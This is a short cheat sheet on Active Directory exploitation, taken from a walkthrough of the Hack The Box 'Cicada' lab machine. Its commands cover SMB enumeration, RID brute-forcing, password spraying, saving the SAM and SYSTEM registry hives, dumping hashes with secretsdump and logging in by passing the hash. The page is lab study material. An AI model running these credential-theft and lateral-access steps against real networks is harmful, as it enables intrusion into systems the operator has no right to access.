## Easy Box:

Here's an enhanced AD exploitation methodology with commands for each step:

---

### Methodology for AD Enumeration and Exploitation

#### **1. Initial Reconnaissance and Scanning**

   - **Identify Open Ports**: Use `nmap` to scan common AD ports.
     ```bash
     nmap $target --top-ports=1000 -sV -v -sC -Pn > nmap.out
     ```

   - **Host Configuration**: Update `/etc/hosts` with the target hostname if needed.
     ```bash
     echo "$target cicada.htb" | sudo tee -a /etc/hosts
     ```

#### **2. SMB Enumeration and Credential Gathering**

   - **Anonymous SMB Access**: Use `smbclient` to list available shares.
     ```bash
     smbclient -L //$target -N
     ```

   - **User Enumeration with RID Brute-forcing**:
     ```bash
     nxc smb $target -u 'anonymous' -p '' --rid-brute 3000
     ```

   - **SMB Information Gathering**:
     ```bash
     enum4linux-ng -A $target
     ```

#### **3. Password Discovery and Validation**

   - **Testing Credentials**: Use tools like `hydra` or `crackmapexec` to test passwords.
     ```bash
     hydra -L usernames.txt -p $password smb://$target
     ```

   - **Access Restricted Shares with Discovered Credentials**:
     ```bash
     smbclient //$target/DEV -U 'username' -p 'password'
     ```

#### **4. Initial Foothold**

   - **Remote Access**: Use `evil-winrm` to log in with valid credentials.
     ```bash
     evil-winrm -i $target -u 'username' -p 'password'
     ```

#### **5. Privilege Escalation**

   - **Identify Special Privileges**:
     ```bash
     whoami /all
     ```

   - **Backup Privileges**: Use `reg` to save critical files to accessible locations.
     ```bash
     reg save hklm\sam c:\Temp\sam
     reg save hklm\system c:\Temp\system
     ```

#### **6. Extract and Use Password Hashes**

   - **Download SAM and SYSTEM Files**:
     ```bash
     download c:\Temp\sam
     download c:\Temp\system
     ```

   - **Dump Password Hashes**:
     ```bash
	python3 secretsdump.py -sam sam -system system LOCAL > hashes.txt
     ```

   - **Root Access**: Use `evil-winrm` with Administrator hash.
     ```bash
	evil-winrm -i $target -u 'Administrator' -H 'aad3b435b51404eeaad3b435b51404ee:hash'
     ```

This methodical approach covers enumeration, initial access, and privilege escalation for AD exploitation for an easy box. Took from Cicada machine.

##### Reference: 

1. [Medium Cicada machine Walkthrough](https://medium.com/@misterxcrypt/cicada-walkthrough-hackthebox-2bb9f961ea42)
2. [Sickboy github AD Cheat sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)

---

